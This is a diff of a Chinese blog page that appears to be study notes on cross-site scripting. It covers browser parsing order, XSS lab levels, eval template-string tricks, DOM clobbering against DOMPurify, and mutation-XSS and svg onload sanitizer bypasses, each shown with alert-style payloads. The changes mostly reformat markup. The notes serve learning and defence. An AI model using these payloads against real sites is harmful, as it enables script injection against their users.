@@ -102,12 +102,12 @@ Yume Shoka = Hexo</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipetfk5zwj20zk0m8e81.jpg"></li>
-          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipeu1usa7j20zk0m8b29.jpg"></li>
-          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipevarprfj20zk0m8npd.jpg"></li>
-          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclxxcb6rj20zk0m8b29.jpg"></li>
-          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giph4lm9i7j20zk0m84qp.jpg"></li>
-          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipexj2jgzj20zk0m8b09.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclga70tsj20zk0m84mr.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclx6phq6j20zk0m8e36.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipexw3o58j20zk0m8e81.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclhnx9glj20zk0m8npd.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipey84bjtj20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicis081o9j20zk0m8dmr.jpg"></li>
         </ul>
       </div>
     </header>
@@ -194,13 +194,13 @@ Yume Shoka = Hexo</title>
 <p>在 HTML 中有五类元素：</p>
 <ol>
 <li>
-<p>空元素 (Void elements)，如<area>,<base>等等</p>
+<p>空元素 (Void elements)，如 <code>&lt;area&gt;</code> , <code>&lt;base&gt;</code>  等等</p>
 </li>
 <li>
-<p>原始文本元素 (Raw text elements)，有<script>和<style></p>
+<p>原始文本元素 (Raw text elements)，有 <code>&lt;script&gt;</code>  和 <code>&lt;style&gt;</code></p>
 </li>
 <li>
-<p>RCDATA 元素 (RCDATA elements)，有<textarea>和<title></p>
+<p>RCDATA 元素 (RCDATA elements)，有 <code>&lt;textarea&gt;</code>  和 <code>&lt;title&gt;</code></p>
 </li>
 <li>
 <p>外部元素 (Foreign elements)，例如 MathML 命名空间或者 SVG 命名空间的元素</p>
@@ -227,7 +227,7 @@ Yume Shoka = Hexo</title>
 <p>基本元素，可以容纳文本、字符引用、其他元素和注释</p>
 </li>
 </ol>
-<p>如果我们回头看 HTML 解析器的规则，其中有一种可以容纳字符引用的情况是 “RCDATA 状态中的字符引用”。这意味着在<textarea>和<title>标签中的字符引用会被 HTML 解析器解码。这里要再提醒一次，在解析这些字符引用的过程中不会进入 “标签开始状态”。这样就可以解释问题 5 了。另外，对 RCDATA 有个特殊的情况。在浏览器解析 RCDATA 元素的过程中，解析器会进入 “RCDATA 状态”。在这个状态中，如果遇到 “&lt;” 字符，它会转换到 “RCDATA 小于号状态”。如果 “&lt;” 字符后没有紧跟着 “/” 和对应的标签名，解析器会转换回 “RCDATA 状态”。这意味着在 RCDATA 元素标签的内容中（例如<textarea>或<title>的内容中），唯一能够被解析器认做是标签的就是 “</textarea>” 或者 “</title>”。因此，在 “<textarea>” 和 “<title>” 的内容中不会创建标签，就不会有脚本能够执行。这也就解释了为什么问题 6 中的脚本不会被执行。</p>
+<p>如果我们回头看 HTML 解析器的规则，其中有一种可以容纳字符引用的情况是 “RCDATA 状态中的字符引用”。这意味着在 <code>&lt;textarea&gt;</code>  和 <code>&lt;title&gt;</code>  标签中的字符引用会被 HTML 解析器解码。这里要再提醒一次，在解析这些字符引用的过程中不会进入 “标签开始状态”。这样就可以解释问题 5 了。另外，对 RCDATA 有个特殊的情况。在浏览器解析 RCDATA 元素的过程中，解析器会进入 “RCDATA 状态”。在这个状态中，如果遇到 “&lt;” 字符，它会转换到 “RCDATA 小于号状态”。如果 “&lt;” 字符后没有紧跟着 “/” 和对应的标签名，解析器会转换回 “RCDATA 状态”。这意味着在 RCDATA 元素标签的内容中（例如 <code>&lt;textarea&gt;</code>  或 <code>&lt;title&gt;</code>  的内容中），唯一能够被解析器认做是标签的就是 “ <code>&lt;/textarea&gt;</code> ” 或者 “ <code>&lt;/title&gt;</code> ”。因此，在 “ <code>&lt;textarea&gt;</code> ” 和 “ <code>&lt;title&gt;</code> ” 的内容中不会创建标签，就不会有脚本能够执行。这也就解释了为什么问题 6 中的脚本不会被执行。</p>
 <h3 id="url解析"><a class="markdownIt-Anchor" href="#url解析">#</a> URL 解析</h3>
 <p>首先，URL 资源类型必须是 ASCII 字母（U+0041-U+005A || U+0061-U+007A），不然就会进入 “无类型” 状态。例如， <code>你不能对协议类型进行任何的编码操作</code> ，不然 URL 解析器会认为它无类型。这就是为什么问题 1 中的代码不能被执行。因为 URL 中被编码的 “javascript” 没有被解码，因此不会被 URL 解析器识别。该原则对协议后面的 “：”（冒号）同样适用，即问题 3 也得到解答。然而，你可能会想到：为什么问题 2 中的脚本被执行了呢？如果你记得我们在 HTML 解析部分讨论的内容的话，是否还记得有一个情况叫做 “属性值中的字符引用”，在这个情况中字符引用会被解码。我们将稍后讨论解析顺序，但在这里，HTML 解析器解析了文档，创建了标签 token，并且对 href 属性里的字符实体进行了解码。然后，当 HTML 解析器工作完成后，URL 解析器开始解析 href 属性值里的链接。在这时，“javascript” 协议已经被解码，它能够被 URL 解析器正确识别。然后 URL 解析器继续解析链接剩下的部分。由于是 “javascript” 协议，JavaScript 解析器开始工作并执行这段代码，这就是为什么问题 2 中的代码能够被执行。</p>
 <h3 id="javascript解析"><a class="markdownIt-Anchor" href="#javascript解析">#</a> JavaScript 解析</h3>
@@ -254,13 +254,13 @@ Yume Shoka = Hexo</title>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.1.6:18888/xss/level1.php?name=test</span></span><br><span class="line"></span><br><span class="line">?name=&lt;script&gt;<span class="title function_ invoke__">alert</span>(<span class="number">1</span>)</span><br><span class="line">?name=&lt;input onclick/onmouseover&gt;</span><br><span class="line">?name=&lt;a onclick/javascript&gt;</span><br><span class="line">?name=&lt;img src&gt;</span><br><span class="line">?name=&lt;iframe&gt;</span><br><span class="line">?name=&lt;svg&gt;</span><br><span class="line">?name=&lt;video onloadstart=<span class="title function_ invoke__">alert</span>(<span class="number">1</span>) src=<span class="string">&quot;/media/hack-the-plant.mp4&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
 <p>闭合 大小写 双写 编码</p>
 <p>Level 10</p>
-<p>?keyword=111&amp;t_sort=1 type=“text” onclick=alert(1)</p>
-<p>?keyword=111&amp;t_sort=1 type=“text” onfocus=alert(1) autofocus=&quot;true</p>
+<p><code>?keyword=111&amp;t_sort=1 type=&quot;text&quot; onclick=alert(1)</code></p>
+<p><code>?keyword=111&amp;t_sort=1 type=&quot;text&quot; onfocus=alert(1) autofocus=&quot;true</code></p>
 <p>Level 11</p>
-<p>Post 提交 referer</p>
+<p><code>Post 提交 referer</code></p>
 <h2 id="模板字符串"><a class="markdownIt-Anchor" href="#模板字符串">#</a> 模板字符串</h2>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//弹窗，因为有tostring方法，把数组中第一个参数转为字符串</span></span><br><span class="line">alert<span class="string">`a`</span></span><br><span class="line"><span class="literal">undefined</span>    </span><br><span class="line"></span><br><span class="line"><span class="comment">//弹窗，因为有$&#123;&#125;执行表达式</span></span><br><span class="line"><span class="built_in">eval</span><span class="string">`<span class="subst">$&#123;alert(<span class="number">1</span>)&#125;</span>`</span></span><br><span class="line">(<span class="number">2</span>) [<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="attr">raw</span>: <span class="title class_">Array</span>(<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment">//弹窗，相当于2前后加了个字符串</span></span><br><span class="line"><span class="built_in">eval</span><span class="string">`a<span class="subst">$&#123;alert(<span class="number">1</span>)&#125;</span>b`</span></span><br><span class="line">(<span class="number">2</span>) [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="attr">raw</span>: <span class="title class_">Array</span>(<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment">//不弹，因为没有tostring，会放在数组中输出</span></span><br><span class="line"><span class="built_in">eval</span><span class="string">`a`</span></span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="attr">raw</span>: <span class="title class_">Array</span>(<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment">//不弹，和上一条一样</span></span><br><span class="line"><span class="built_in">eval</span><span class="string">`alert(1)`</span></span><br><span class="line">[<span class="string">&#x27;alert(1)&#x27;</span>, <span class="attr">raw</span>: <span class="title class_">Array</span>(<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment">//弹窗，和3一样</span></span><br><span class="line"><span class="built_in">eval</span><span class="string">`alert(1) <span class="subst">$&#123;alert(<span class="number">1</span>)&#125;</span>`</span></span><br><span class="line">(<span class="number">2</span>) [<span class="string">&#x27;alert(1) &#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="attr">raw</span>: <span class="title class_">Array</span>(<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment">//弹窗，此时不是模板字符串，是函数</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="title function_">alert</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">//不弹，虽然有$&#123;&#125;执行表达式，但此时alert是字符串</span></span><br><span class="line"><span class="built_in">eval</span><span class="string">`<span class="subst">$&#123;<span class="string">&#x27;alert(1)&#x27;</span>&#125;</span>`</span></span><br><span class="line">[<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="attr">raw</span>: <span class="title class_">Array</span>(<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment">//不弹，虽然可以字符串中解析16进制和Unicode，但此时解析完后仍然为字符串</span></span><br><span class="line"><span class="built_in">eval</span><span class="string">`<span class="subst">$&#123;<span class="string">&#x27;alert\x281\x29&#x27;</span>&#125;</span>`</span></span><br><span class="line">[<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="attr">raw</span>: <span class="title class_">Array</span>(<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment">//上面都是先解析$&#123;&#125;，最后在解析eval</span></span><br><span class="line"><span class="comment">//对于call方法</span></span><br><span class="line"><span class="comment">//弹窗</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;alert(1)&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//弹窗，此时相当于eval(&#x27;alert(1)&#x27;),call相当于将eval内的执行</span></span><br><span class="line"><span class="built_in">eval</span>.<span class="property">call</span><span class="string">`<span class="subst">$&#123;<span class="string">&#x27;alert\x281\x29&#x27;</span>&#125;</span>`</span></span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//弹窗，前面的eval相当于tag，模板字符串前可以有tag，注意返回值的不同，此时返回的不是数组 </span></span><br><span class="line"><span class="string">`aaa <span class="subst">$&#123;alert<span class="string">`1`</span>&#125;</span> bbbb`</span></span><br><span class="line"><span class="string">&#x27;aaa undefined bbbb&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//报错，不能对符号编码，因此的prompt不是字符串</span></span><br><span class="line"><span class="built_in">eval</span><span class="string">`<span class="subst">$&#123;prompt\x281\x29&#125;</span>`</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">//弹窗</span></span><br><span class="line"><span class="string">eval.call`</span>$&#123;<span class="title function_">prompt</span>(<span class="number">1</span>)&#125;<span class="string">`</span></span><br><span class="line"><span class="string">undefined</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//弹窗</span></span><br><span class="line"><span class="string">eval.call`</span>aaa$&#123;<span class="title function_">prompt</span>(<span class="number">1</span>)&#125;bbb<span class="string">`</span></span><br><span class="line"><span class="string">undefined</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//不弹</span></span><br><span class="line"><span class="string">eval.call`</span><span class="title function_">alert</span>(<span class="number">1</span>)<span class="string">`</span></span><br><span class="line"><span class="string">undefined</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//弹窗</span></span><br><span class="line"><span class="string">eval.call`</span>$&#123;<span class="title function_">alert</span>(<span class="number">1</span>)&#125;<span class="string">`</span></span><br><span class="line"><span class="string">undefined</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//如果aaaa全局有定义返回变量对应的值，没有定义则not define 报错</span></span><br><span class="line"><span class="string">eval(&#x27;aaaa&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//返回[&quot;aaaaaaaaa&quot;]</span></span><br><span class="line"><span class="string">eval([&quot;aaaaaaaaa&quot;]);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//eval只能接收第一个参数的值，他只有一个参数</span></span><br><span class="line"><span class="string">eval`</span>$&#123;<span class="title function_">prompt</span>(<span class="number">1</span>)&#125;<span class="string">`</span></span><br><span class="line"><span class="string">[&#x27;&#x27;, &#x27;&#x27;, raw: Array(2)]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//`</span><span class="string">`两端字符串依然为空，但中间是一个字符串不是函数，此时第二个参数为&#x27;prompt(1)&#x27;,但eval不接</span></span><br><span class="line"><span class="string">eval`</span>$&#123;<span class="string">&#x27;prompt(1)&#x27;</span>&#125;<span class="string">`</span></span><br><span class="line"><span class="string">[&#x27;&#x27;, &#x27;&#x27;, raw: Array(2)]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//输入11111,打印11111.&#123;&#125;首先执行，返回([&quot;&quot;,&quot;&quot;],&#x27;prompt(1)&#x27;),此时数组为空，即第一个参数为空，那么call指向全局对象，全局对象window中有prompt函数，执行eval(&#x27;prompt(1)&#x27;)</span></span><br><span class="line"><span class="string">eval(&#x27;prompt(1)&#x27;)</span></span><br><span class="line"><span class="string">&#x27;11111&#x27;</span></span><br><span class="line"><span class="string">eval.call`</span>$&#123;<span class="string">&#x27;prompt(1)&#x27;</span>&#125;<span class="string">`</span></span><br><span class="line"><span class="string">&#x27;11111&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//输入aaaa,打印aaaa undefined.&#123;&#125;首先执行，返回([&quot;&quot;,&quot;&quot;],&#x27;prompt(1)&#x27;),此时数组为空，即第一个参数为空，那么call指向全局对象，全局对象没有aaaa方法，返回undefined,但注意如果输入为数字那么原样返回</span></span><br><span class="line"><span class="string">eval.call`</span>$&#123;<span class="title function_">prompt</span>(<span class="number">1</span>)&#125;<span class="string">`</span></span><br><span class="line"><span class="string">Uncaught ReferenceError: aaaa is not defined</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//eval别名调用，指向全局变量，因为js不允许指向prompt.第二个参数没传值，因此返回undefined</span></span><br><span class="line"><span class="string">eval.call`</span><span class="title function_">prompt</span>(<span class="number">1</span>)<span class="string">`</span></span><br><span class="line"><span class="string">undefined</span></span><br></pre></td></tr></table></figure>
-<p>模板字符串中需要有表达式 ${} 才能执行 eval``</p>
+<p>模板字符串中需要有表达式 ${} 才能执行  <code>eval</code></p>
 <p>eval () 是个函数，会将传入的字符串当做代码执行，如果全局没有该字符串变量，会报错 undefined，如果传入的不是字符串，eval 会将参数直接返回</p>
 <p>alert 有 tostring 方法，将数字专为字符串执行</p>
 <p>eval 没有 tostring，将数字放入数组中</p>
@@ -351,7 +351,7 @@ Yume Shoka = Hexo</title>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">name</span>=<span class="string">&quot;a&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;b&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">name</span>=<span class="string">&quot;c&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">name</span>=<span class="string">&quot;d&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="variable language_">window</span>.<span class="property">c</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>通过 html 影响 js</p>
 <p>1) 利用 html 标签的属性 id，很容易在 window 对象上创建任意的属性，但是我们能在新对象上创建新属性吗？</p>
-<p>2) 怎么控制 DOM elements 被强制转为 string 之后的值，大多数的 dom 节点被转为 string 后是 [object HTMLInputElement]。</p>
+<p>2) 怎么控制 DOM elements 被强制转为 string 之后的值，大多数的 dom 节点被转为 string 后是 <code>[object HTMLInputElement]</code> 。</p>
 <p>关于问题 1)</p>
 <p>最常引用的解决方法是使用 <code>&lt;form&gt;</code>  标签。标记的每个 <code>&lt;input&gt;</code>  都属于 <code>&lt;form&gt;</code>  后代，该属性 <code>&lt;form&gt;</code>  引用 <code>name</code>  属性可以取到 <code>&lt;input&gt;</code> 。考虑以下示例：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=test1&gt;</span><br><span class="line">  &lt;input name=test2&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  alert(test1.test2); // alerts &quot;[object HTMLInputElement]&quot;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
@@ -384,8 +384,8 @@ Yume Shoka = Hexo</title>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;boomer&quot;</span>&gt;</span>Ok, Boomer.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    boomer.<span class="property">innerHTML</span> = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(location).<span class="property">searchParams</span>.<span class="title function_">get</span>(<span class="string">&#x27;boomer&#x27;</span>) || <span class="string">&quot;Ok, Boomer&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(ok, <span class="number">2000</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>setTimeout (ok, 2000) 中的 ok 可以接收一个函数或者字符串，如果我们能够向 ok 这个变量注入可执行的 payload，那么也就能成功弹框</p>
 <p>可以使用 DOM Clobbering 的方式，通过向 HTML 注入 DOM 元素，来实现操作 JavaScript 变量</p>
-<p>首先，要构造一个变量 ok，我们可以通过创建一个 id=ok 的 DOM 元素来实现，比如<div id="ok"></div></p>
-<p>然后，ok 需要接受一个字符串作为值，而在对<a>标签调用 toString () 方法时，会返回属性 href 的值，所以，我们可以选择<a>标签作为构造对象</p>
+<p>首先，要构造一个变量 ok，我们可以通过创建一个 id=ok 的 DOM 元素来实现，比如 <code>&lt;div id=&quot;ok&quot;&gt;&lt;/div&gt;</code></p>
+<p>然后，ok 需要接受一个字符串作为值，而在对 <code>&lt;a&gt;</code>  标签调用 toString () 方法时，会返回属性 <code>href</code>  的值，所以，我们可以选择 <code>&lt;a&gt;</code>  标签作为构造对象</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?boomer=&lt;a id=ok href=cid:alert(1337)&gt;</span><br></pre></td></tr></table></figure>
 <p>href 的值要遵守 protocol:uri 的格式，然而，在 href 里直接使用 javascript: 协议是不行的</p>
 <p>通过查看 DOMPurify 的源码可以发现，它支持的合法的协议 有 mailto, tel, xmpp 等等，随便选择一个即可</p>
@@ -477,7 +477,7 @@ Yume Shoka = Hexo</title>
 <li><code>svg title</code></li>
 </ul>
 <p>但并不是所有 mathml 文本集成点和 html 集成点子元素都是 html 命名空间的</p>
-<p>html 规范中，大部分 Mathml 文本集成点的子元素都是 HTML 命名空间的啊，但是除了<mglyph><malignmark>。当这两直接是 Mathml 文本集成点的直接子元素的时候。他们不会切换命名空间。</p>
+<p>html 规范中，大部分 Mathml 文本集成点的子元素都是 HTML 命名空间的啊，但是除了 <code>&lt;mglyph&gt;&lt;malignmark&gt;</code> 。当这两直接是 Mathml 文本集成点的直接子元素的时候。他们不会切换命名空间。</p>
 <p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-10-1536x252.png" alt=""></p>
 <p>最终 payload1:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
@@ -526,7 +526,7 @@ Yume Shoka = Hexo</title>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;notify&quot;&gt;</span><br><span class="line">	&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;</span><br><span class="line">		&lt;b&gt;Meme&lt;/b&gt; </span><br><span class="line">		created from </span><br><span class="line">		&lt;img name=&quot;notify&quot;&gt;</span><br><span class="line">		&lt;style&gt;&lt;style&gt;&lt;/style&gt;</span><br><span class="line">		&lt;script&gt;alert()//&lt;/style&gt;&lt;/div&gt;&lt;/script&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
 <h2 id="svg深入研究"><a class="markdownIt-Anchor" href="#svg深入研究">#</a> &lt;svg&gt; 深入研究</h2>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">data</span> = <span class="title function_ invoke__">decodeURIComponent</span>(location.hash.<span class="title function_ invoke__">substr</span>(<span class="number">1</span>));</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">root</span> = document.<span class="title function_ invoke__">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">root.innerHTML = data;</span><br><span class="line"><span class="keyword">for</span> (let el of root.<span class="title function_ invoke__">querySelectorAll</span>(<span class="string">&#x27;*&#x27;</span>)) &#123;</span><br><span class="line">     <span class="keyword">for</span> (let attr of el.attributes) &#123;</span><br><span class="line">         el.<span class="title function_ invoke__">removeAttribute</span>(name)</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">document.body.<span class="title function_ invoke__">appendChild</span>(root)</span><br></pre></td></tr></table></figure>
-<p>HTML5 中 innerHtml 不执行插入的<script>标签</p>
+<p>HTML5 中 innerHtml 不执行插入的 <code>&lt;script&gt;</code>  标签</p>
 <p><strong>移除元素后，元素向前补，但指针向后移，导致没有完全移除所有元素</strong></p>
 <p>exp:  <code>&lt;img a src='a' b onerror=alert(1)&gt;</code></p>
 <p>因此我们一般不在同一个数组边循环边删除</p>
@@ -542,17 +542,17 @@ Yume Shoka = Hexo</title>
 <p>那么很明显， <code>alert(1)</code>  是在页面上 script 标签中的代码全部执行完毕以后才被调用的。这里涉及到浏览器渲染的另外一部分内容： <strong>在 DOM 树构建完成以后，就会触发</strong> <code>DOMContentLoaded</code>  事件，接着加载脚本、图片等外部文件，全部加载完成之后触发 <code>load</code> <strong> 事件</strong>。</p>
 <p>页面的 JS 执行是会阻塞 DOM 树构建的。<strong>所以总的来说，在 script 标签内的 JS 执行完毕以后，DOM 树才会构建完成，接着才会加载图片，然后发现加载内容出错才会触发</strong> <code>error</code> <strong> 事件</strong>。</p>
 <p>由于 js 阻塞 dom 树，一直到 js 语句执行结束后，才可以引入 img，此时 img 的属性已经被 sanitizer 清除了，自然也不可能执行事件代码了。</p>
-<p>1.2<svg><svg onload=alert(1)> 可以弹窗原因</p>
+<p>1.2 <code>&lt;svg&gt;&lt;svg onload=alert(1)&gt; </code> 可以弹窗原因</p>
 <p>两个 svg 时，直接弹出了窗口，点击确定以后，调试器才会走到下一行代码，没有执行移除属性的代码。而且，这个地方如果只有一个 <code>&lt;svg onload=alert(1)&gt;</code> ，那么结果将同 img 一样，直到 script 标签结束以后才能执行相关的代码，这样的代码放到挑战里也将失败</p>
 <p>当我们没有正确闭合标签的时候，如 <code>&lt;svg&gt;&lt;svg&gt;</code> ，就可能调用到 <code>PopAll</code>  来清理；而正确闭合的标签就可能调用到其他出栈函数并调用到 <code>PopCommon</code> 。这两个函数有一个共同点，都会调用栈中元素的 <code>FinishParsingChildren</code>  函数。这个函数用于处理子节点解析完毕以后的工作。</p>
 <p><code>FinishParsingChildren</code>  有一个非常明显的判断 <code>IsOutermostSVGSVGElement</code> ，如果是最外层的 svg 则直接返回。</p>
 <p>最外层 svg 的 <code>load</code>  事件由 <code>LocalDOMWindow::dispatchWindowLoadEvent</code>  触发；而其他 svg 的 <code>load</code>  事件则在达到结束标记的时候触发。</p>
 <p>先决条件 在于 svg 不能最外层， onload 必须保证不是最外层属性，不是最外层 onload 会在 innerHTML 之前执行</p>
-<p>当没有过滤代码时：&lt;svg onload=console.log (“svg0”)&gt;&lt;svg onload=console.log (“svg1”)&gt;&lt;svg onload=console.log (“svg2”)&gt;</p>
+<p>当没有过滤代码时： <code>&lt;svg onload=console.log(&quot;svg0&quot;)&gt;&lt;svg onload=console.log(&quot;svg1&quot;)&gt;&lt;svg onload=console.log(&quot;svg2&quot;)&gt;</code></p>
 <p>触发顺序为</p>
